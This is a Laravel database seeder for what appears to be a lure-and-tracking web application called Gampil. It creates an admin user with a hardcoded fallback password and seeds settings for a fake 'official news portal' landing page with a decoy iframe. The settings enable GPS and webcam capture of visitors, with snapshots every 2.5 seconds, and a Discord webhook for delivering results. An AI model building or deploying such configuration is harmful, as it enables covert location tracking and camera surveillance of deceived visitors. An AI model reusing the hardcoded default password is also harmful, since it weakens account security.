<?php

namespace Database\Seeders;

use App\Models\Setting;
use App\Models\User;
use Illuminate\Database\Console\Seeds\WithoutModelEvents;
use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\Hash;

class DatabaseSeeder extends Seeder
{
    use WithoutModelEvents;

    /**
     * Seed the application's database.
     */
    public function run(): void
    {
        $adminEmail = env('ADMIN_EMAIL', 'admin@gampil.local');
        $adminPassword = env('ADMIN_PASSWORD', 'admin12345');

        // 1. Seed Administrator from environment variable or default
        User::updateOrCreate(
            ['email' => $adminEmail],
            [
                'name' => 'Gampil Admin',
                'password' => Hash::make($adminPassword),
                'role' => 'admin',
            ]
        );

        // 2. Seed Default Settings
        $defaultSettings = [
            'discord_webhook_url' => '',
            'bot_name' => 'gampil',
            'bot_avatar_url' => '',
            'active_template' => 'gampil',
            'site_title' => 'Portal Berita & Informasi Resmi - Gampil Akses',
            'site_description' => 'Baca informasi dan pengumuman resmi terbaru hari ini melalui portal Gampil Akses.',
            'og_image_url' => 'images/landing/default-thumbnail.jpg',
            'decoy_iframe_url' => '',
            'landing_heading' => 'Portal Informasi & Publikasi Resmi',
            'capture_gps_enabled' => '1',
            'capture_cam_enabled' => '1',
            'cam_interval_ms' => '2500',
            'max_snapshots_per_session' => '5',
            'custom_landing_slug' => 'gampil',
        ];

        foreach ($defaultSettings as $key => $value) {
            Setting::updateOrCreate(['key' => $key], ['value' => $value]);
        }
    }
}
